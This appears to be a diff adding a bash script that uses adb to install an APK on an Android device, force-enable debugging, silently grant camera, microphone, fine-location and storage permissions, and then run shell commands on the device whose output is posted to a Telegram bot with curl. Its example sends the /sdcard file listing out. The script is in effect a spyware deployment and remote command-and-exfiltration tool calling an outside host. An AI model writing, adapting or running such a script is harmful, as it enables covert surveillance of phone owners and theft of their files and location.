@@ -1,0 +1,48 @@
+an APK, granting permissions, and connecting to a Telegram bot for executing commands and sending the output back to the bot.
+
+#!/bin/bash
+
+# Path to the APK file
+APK_PATH="/path/to/your/app.apk"
+
+# Package name of the app
+PACKAGE_NAME="com.example.yourapp"
+
+# Telegram bot token
+TELEGRAM_BOT_TOKEN="your_telegram_bot_token"
+# Telegram chat ID (you can get this by sending a message to your bot and checking the updates)
+TELEGRAM_CHAT_ID="your_telegram_chat_id"
+
+# Enable USB debugging
+adb shell settings put global development_settings_enabled 1
+adb shell settings put global adb_enabled 1
+
+# Install the APK
+adb install -r "$APK_PATH"
+
+# Grant permissions
+adb shell pm grant "$PACKAGE_NAME" android.permission.CAMERA
+adb shell pm grant "$PACKAGE_NAME" android.permission.RECORD_AUDIO
+adb shell pm grant "$PACKAGE_NAME" android.permission.ACCESS_FINE_LOCATION
+adb shell pm grant "$PACKAGE_NAME" android.permission.WRITE_EXTERNAL_STORAGE
+
+# Start the main activity
+adb shell am start -n "$PACKAGE_NAME/.MainActivity"
+
+# Function to send messages to the Telegram bot
+send_telegram_message() {
+    local message=$1
+    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="$TELEGRAM_CHAT_ID" -d text="$message"
+}
+
+# Function to execute commands and send the output to Telegram
+execute_and_report() {
+    local command=$1
+    local output=$(adb shell "$command")
+    send_telegram_message "Command: $command\nOutput: $output"
+}
+
+# Example usage: execute a command and report the output
+execute_and_report "ls /sdcard"
+
+echo "APK installed, permissions granted, and Telegram bot connected successfully."
